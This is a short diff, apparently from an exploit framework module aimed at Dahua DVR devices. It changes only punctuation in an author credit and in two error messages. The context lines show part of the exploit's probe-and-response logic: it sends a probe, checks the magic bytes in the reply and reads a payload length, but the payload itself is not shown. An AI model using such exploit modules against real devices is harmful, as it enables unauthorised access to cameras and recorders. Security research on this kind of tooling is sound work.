@@ -58,7 +58,7 @@ class Exploit(BaseExploit):
         ),
         "authors": (
             "Jake Reynolds (depth security)",
-            "André Henrique (@mrhenrike) — EmbedXPL-Forge",
+            "André Henrique (@mrhenrike)  -  EmbedXPL-Forge",
         ),
         "devices": (
             "Dahua DVR",
@@ -83,12 +83,12 @@ class Exploit(BaseExploit):
             sock.sendall(_PROBE)
             header = _recv_all(sock, 20)
             if len(header) < 20:
-                print_error("Incomplete response — not a Dahua device")
+                print_error("Incomplete response  -  not a Dahua device")
                 return
 
             magic = header[:4]
             if magic != _MAGIC:
-                print_error("Invalid magic bytes — target is not a Dahua device")
+                print_error("Invalid magic bytes  -  target is not a Dahua device")
                 return
 
             payload_len = struct.unpack("<I", header[16:20])[0]
